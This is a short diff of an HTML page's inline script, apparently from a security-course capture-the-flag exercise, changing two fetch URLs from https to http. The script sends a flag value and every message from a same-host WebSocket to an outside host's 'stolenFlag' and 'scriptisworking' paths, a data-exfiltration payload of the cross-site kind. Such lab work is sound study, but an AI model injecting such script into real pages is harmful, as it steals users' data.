@@ -8,10 +8,10 @@
         <script>
 const ws = new WebSocket(`ws://${window.location.host}/ws`);
 let flag=`ce441{salam}`;
-fetch(`https://hw2p3.ckodser.ir/stolenFlag/${flag}`);
+fetch(`http://hw2p3.ckodser.ir/stolenFlag/${flag}`);
 ws.onmessage = (event) => {
   const response = event.data;
-  fetch(`https://hw2p3.ckodser.ir/scriptisworking/${response}`);
+  fetch(`http://hw2p3.ckodser.ir/scriptisworking/${response}`);
 };
         </script>
     </body>
